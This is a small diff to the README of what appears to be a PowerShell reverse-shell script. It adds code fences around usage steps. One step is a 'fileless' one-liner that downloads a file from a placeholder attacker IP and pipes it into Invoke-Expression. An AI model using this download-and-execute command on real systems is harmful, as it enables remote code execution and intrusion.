@@ -9,15 +9,16 @@
  # How to Use
  
  You can save as .ps1 and runas in PowerShell:
- 
+ ```Powershell
  .\r3vps43ll.ps1
- 
+ ```
  # Or
  
  Run it like this in PowerShell:
- 
+ ```Powershell
  gc -raw .\r3vps43ll.txt | iex
-
+```
 # Fileless Approach
-
+```Powershell
 (iwr 'http://< YOUR IP >/< DIRECTORY >/filename.txt' -UseBasicParsing) | iex
+```
